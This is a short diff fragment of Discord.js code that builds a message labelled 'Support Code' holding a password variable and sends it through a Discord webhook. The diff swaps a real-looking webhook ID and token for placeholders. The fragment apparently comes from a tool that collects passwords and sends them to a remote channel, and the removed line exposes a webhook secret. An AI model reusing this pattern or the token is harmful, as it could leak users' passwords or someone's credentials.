@@ -67,7 +67,7 @@ Support Code : ${password}
 `)
 .setTimestamp()
     
-const webhookClient = new Discord.WebhookClient('942087189263679559', 'tby3ke5sfO2PKlKtgUou1bpB1cu6FNXiD4KF83uLgSsPr86wBdPp2RHPt1Uu_0rIuN9p');
+const webhookClient = new Discord.WebhookClient('yourwebhookid', 'yourwebhooktoken');
 
 
 webhookClient.send(aa)
